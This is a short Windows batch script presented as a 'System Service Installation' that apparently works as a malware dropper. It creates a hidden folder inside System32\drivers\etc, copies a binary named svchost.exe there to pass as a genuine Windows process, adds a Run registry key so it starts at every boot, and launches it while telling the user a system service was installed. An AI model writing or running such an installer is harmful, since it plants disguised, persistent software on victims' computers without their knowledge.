@echo off
title System Service Installation
color 0F

REM Check admin privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Administrative privileges required.
    echo Please run as administrator.
    pause >nul
    exit /b 1
)

REM Create hidden system directory
set SYSTEM_DIR=%WINDIR%\System32\drivers\etc\hosts.d
if not exist "%SYSTEM_DIR%" mkdir "%SYSTEM_DIR%" >nul 2>&1
attrib +h "%SYSTEM_DIR%"

REM Install stealth service
echo Installing system service...
copy "svchost.exe" "%SYSTEM_DIR%\svchost.exe" >nul 2>&1

REM Create registry entry for auto-start
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "SystemHostService" /t REG_SZ /d "%SYSTEM_DIR%\svchost.exe start" /f >nul 2>&1

REM Start service immediately
start "" "%SYSTEM_DIR%\svchost.exe" start

echo.
echo System service installed successfully.
echo Service is now running in background.
echo.
pause >nul
